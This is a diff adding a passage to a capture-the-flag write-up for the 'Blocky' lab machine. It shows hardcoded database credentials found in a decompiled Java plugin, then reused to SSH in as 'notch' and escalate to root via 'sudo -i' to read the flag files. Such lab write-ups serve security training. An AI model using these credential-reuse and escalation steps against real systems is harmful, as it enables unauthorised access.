@@ -48,5 +48,69 @@ I am used to procyon java disassembler but for some reason, I could not build it
 
 Using jd-gui, I browsed the two jar files - BlockyCore.jar and griefprevention.jar.
 
+BlockyCore.jar once disassembled shows BlockyCore.class with the following contents:
+
+```
+package com.myfirstplugin;
+
+public class BlockyCore {
+  public String sqlHost = "localhost";
+  
+  public String sqlUser = "root";
+  
+  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
+  
+  public void onServerStart() {}
+  
+  public void onServerStop() {}
+  
+  public void onPlayerJoin() {
+    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
+  }
+  
+  public void sendMessage(String username, String message) {}
+}
+```
+
+Tried to ssh into the box as root with the above password but it did not work.
+
+The message "Welcome to the Blcokycraft" shows up with author notch on the webpage, so I tried to ssh as notch. This time it worked.
+
+```
+$ssh notch@10.10.10.37
+notch@10.10.10.37's password: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+7 packages can be updated.
+7 updates are security updates.
+
+
+Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230
+notch@Blocky:~$ ls
+minecraft  user.txt
+notch@Blocky:~$ cat user.txt 
+```
+
+Now to get privilege escalation, I tried "sudo -l". It asked for a passwd and I tried the above passwd. It worked.
+
+```
+notch@Blocky:~$ sudo -l
+[sudo] password for notch: 
+Matching Defaults entries for notch on Blocky:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User notch may run the following commands on Blocky:
+    (ALL : ALL) ALL
+notch@Blocky:~$ sudo -i
+root@Blocky:~# ls
+root.txt
+root@Blocky:~# cat root.txt 
+```
+
 
 
